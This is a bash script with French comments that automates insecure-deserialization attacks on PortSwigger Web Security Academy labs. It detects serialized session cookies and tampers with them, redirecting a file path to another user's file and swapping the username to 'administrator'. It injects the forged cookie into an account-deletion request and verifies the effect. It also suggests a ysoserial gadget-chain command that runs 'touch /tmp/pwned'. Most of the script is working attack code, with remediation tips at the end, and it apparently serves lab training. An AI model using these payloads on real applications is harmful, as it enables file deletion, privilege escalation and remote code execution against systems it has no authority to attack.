#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
COOKIE="session=<your-session-cookie>"
DELETE_PATH="/my-account/delete"
CHECK_PATH="/my-account"
USERNAME="wiener"
PASSWORD="peter"
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Détection automatique de données sérialisées (cookies/réponses)
detect_serialized_data() {
    print_sep
    echo "[1] Détection de données sérialisées dans les cookies et réponses"
    resp=$(curl -sk -I "$TARGET_URL")
    cookies=$(echo "$resp" | grep -i "Set-Cookie")
    echo "- Cookies reçus :"
    echo "$cookies"
    # Recherche de patterns typiques
    if echo "$cookies" | grep -Eq "O:[0-9]+:\""; then
        echo "  [+] Cookie PHP sérialisé détecté."
        export SERIAL_TYPE="php"
        export RAW_COOKIE=$(echo "$cookies" | grep -o "O:[^\;]*")
    elif echo "$cookies" | grep -Eq "rO0AB|ACED0005"; then
        echo "  [+] Cookie Java sérialisé détecté."
        export SERIAL_TYPE="java"
        export RAW_COOKIE=$(echo "$cookies" | grep -o "rO0AB[^;]*")
    elif echo "$cookies" | grep -Eq "eyJ|e30="; then
        echo "  [+] Cookie JSON/base64 détecté."
        export SERIAL_TYPE="json"
        export RAW_COOKIE=$(echo "$cookies" | grep -o "eyJ[^\;]*")
    else
        echo "  [-] Aucun cookie sérialisé détecté automatiquement."
        export SERIAL_TYPE=""
        export RAW_COOKIE=""
    fi
}

# 2. Décodage et modification automatique (PHP, JSON)
decode_and_modify() {
    print_sep
    echo "[2] Décodage et modification de l'objet sérialisé"
    if [[ "$SERIAL_TYPE" == "php" ]]; then
        echo "- Objet PHP détecté :"
        echo "$RAW_COOKIE"
        # Exemple de modification automatique (remplacement d'un chemin d'avatar)
        MODIFIED=$(echo "$RAW_COOKIE" | sed 's#/home/wiener/avatar.jpg#/home/carlos/morale.txt#g')
        echo "  [+] Objet modifié :"
        echo "$MODIFIED"
        export PAYLOAD="$MODIFIED"
    elif [[ "$SERIAL_TYPE" == "json" ]]; then
        echo "- Objet JSON/base64 détecté :"
        decoded=$(echo "$RAW_COOKIE" | base64 -d 2>/dev/null)
        echo "$decoded"
        # Exemple de modification (remplacement d'un champ "user":"wiener" -> "user":"administrator")
        MODIFIED_JSON=$(echo "$decoded" | sed 's/wiener/administrator/g')
        echo "$MODIFIED_JSON" > /tmp/payload.json
        PAYLOAD=$(cat /tmp/payload.json | base64 | tr -d '\n')
        echo "  [+] Objet modifié et ré-encodé :"
        echo "$PAYLOAD"
        export PAYLOAD="$PAYLOAD"
    elif [[ "$SERIAL_TYPE" == "java" ]]; then
        echo "- Objet Java détecté. Utilisez ysoserial pour générer un payload."
        echo "  Exemple : java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' | base64"
        # L'utilisateur doit générer le payload et le coller (complexité gadget chain)
        read -p "Collez ici le payload Java base64 à injecter : " PAYLOAD
        export PAYLOAD="$PAYLOAD"
    else
        echo "  [-] Aucun objet à modifier automatiquement."
        export PAYLOAD=""
    fi
}

# 3. Injection et attaque automatisée
inject_and_attack() {
    print_sep
    echo "[3] Injection du payload et attaque"
    if [[ -n "$PAYLOAD" ]]; then
        echo "- Injection du payload dans le cookie et requête sur $DELETE_PATH"
        resp=$(curl -sk -b "session=$PAYLOAD" "$TARGET_URL$DELETE_PATH")
        echo "$resp" | head -n 10
        export LAST_RESP="$resp"
    else
        echo "  [-] Aucun payload à injecter."
    fi
}

# 4. Contrôle automatisé du résultat
control_effect() {
    print_sep
    echo "[4] Contrôle du résultat de l'attaque"
    # Vérification suppression de fichier ou accès admin
    if echo "$LAST_RESP" | grep -qi "Congratulations\|deleted\|admin\|success\|morale"; then
        echo "  [+] Effet détecté :"
        echo "$LAST_RESP" | grep -i "Congratulations\|deleted\|admin\|success\|morale" | head -n 3
    else
        # Vérification sur la page de compte
        resp=$(curl -sk -b "session=$PAYLOAD" "$TARGET_URL$CHECK_PATH")
        if echo "$resp" | grep -qi "Congratulations\|admin\|morale"; then
            echo "  [+] Effet détecté sur la page de compte :"
            echo "$resp" | grep -i "Congratulations\|admin\|morale" | head -n 3
        else
            echo "  [-] Aucun effet détecté automatiquement. Analyse manuelle recommandée."
        fi
    fi
}

# 5. Conseils/remédiation
print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Ne désérialisez jamais de données contrôlées par l’utilisateur."
    echo "- Utilisez des formats sûrs (JSON, XML) et des bibliothèques à jour."
    echo "- Implémentez des contrôles de type/classe lors de la désérialisation."
    echo "- Pour PHP, n’utilisez pas unserialize() sur des données non sûres."
    echo "- Pour Java, limitez les classes autorisées et utilisez des gadgets connus uniquement pour les tests."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/deserialization"
}

# 6. Synthèse
print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "1. Détection automatique de données sérialisées."
    echo "2. Décodage, modification et génération de payloads adaptés."
    echo "3. Injection et contrôle automatisé de l’effet (suppression, admin, RCE, etc.)."
    echo "4. Application des recommandations de sécurité."
    print_sep
}

# Exécution séquentielle
echo "=== Script PortSwigger Insecure Deserialization : analyse, attaque et contrôle automatisés ==="
detect_serialized_data
decode_and_modify
inject_and_attack
control_effect
print_remediation
print_summary

# End of script
